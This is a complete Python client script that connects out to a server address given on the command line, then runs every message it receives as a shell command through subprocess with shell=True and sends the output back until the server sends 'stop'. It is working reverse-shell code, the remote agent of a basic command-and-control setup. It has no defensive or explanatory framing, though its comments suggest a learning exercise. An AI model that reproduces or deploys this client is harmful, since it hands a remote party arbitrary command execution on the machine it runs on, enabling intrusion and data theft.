import socket
import subprocess
import sys
import ipaddress


# Global Constants
CLIENT_HOST = "127.0.0.1"
MAX_BYTES_REPONSE = 65536
ENCODING = 'utf-8'
STOP_WORD = "stop"

HOST_INDEX = 1
PORT_INDEX = 2

EXPECTED_ARGS = 3  # script name + 2 args

MIN_PORT = 1
MAX_PORT = 65535

CONNECTIONS_TIMEOUT = 1.0


def get_arguments():
    # Get the arguments of the script.

    if len(sys.argv) > EXPECTED_ARGS:
        print("Error: Too many arguments, Usage: python client.py <ip> <port>")
        exit()
    elif len(sys.argv) < EXPECTED_ARGS:
        print("Error: Too few arguments, Usage: python client.py <ip> <port>")
        exit()
    else:
        ip, port_str = sys.argv[HOST_INDEX], sys.argv[PORT_INDEX]

        # Validate IP
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            print(f"Error: Invalid IP address: {ip}")
            exit()

        # Validate port
        try:
            port = int(port_str)
            if not (MIN_PORT <= port <= MAX_PORT):
                raise ValueError
        except ValueError:
            print("Error: Invalid port number (must be 1–65535).")
            exit()

    return ip, port


def create_session(client_host, server_host, port):
    # Create a new TCP Socket object, and connect to the server

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((server_host, port))
    except:
        print("Error: No server found")
        exit()
    print(f"Connecting to {server_host} {port}")

    # Creating and sending a registration request to the server (The request is the client's host).
    registration_request = client_host
    client_socket.sendall(bytes(registration_request, encoding=ENCODING))

    return client_socket

def execute_message(socket_object, message):
    # Execute a message if it exist.

    if message:
        try:
            result = subprocess.run(message, capture_output=True, text=True, shell=True)
            return result
        except Exception as e:
            # Handle errors
            socket_object.sendall(bytes(f"Error executing command: {e}", encoding=ENCODING))
            return None
    else:
        socket_object.sendall(bytes("Error with recieving message", encoding=ENCODING))
        return None
    
def send_response(socket_object, result):
    # Sent the stdout and stderr of the command back to ther server.

    if result:
        response = (result.stdout + result.stderr).strip()
        socket_object.sendall(bytes(response, encoding=ENCODING))
    else:
        socket_object.sendall(bytes("", encoding=ENCODING))


def stop_connection(socket_object):
    # Close the connection of a session.

    socket_object.close()
    print("Disconnecting from server")

def main():

    server_host, port = get_arguments()

    client_socket = create_session(CLIENT_HOST, server_host, port)
    client_socket.settimeout(CONNECTIONS_TIMEOUT)
    with client_socket:
        try:
            # Running until "stop" is sent from the server.
            while True:
                try:
                    # Wait, and recieve the message from the server.
                    message = client_socket.recv(MAX_BYTES_REPONSE).decode(ENCODING)

                    # If the message is stop, stop the session.
                    if message == STOP_WORD:
                        break
                    
                    result = execute_message(client_socket, message)
                    send_response(client_socket, result)
                except socket.timeout:
                    continue

        except KeyboardInterrupt:
            pass
    
    stop_connection(client_socket)

if __name__ == "__main__":
    main()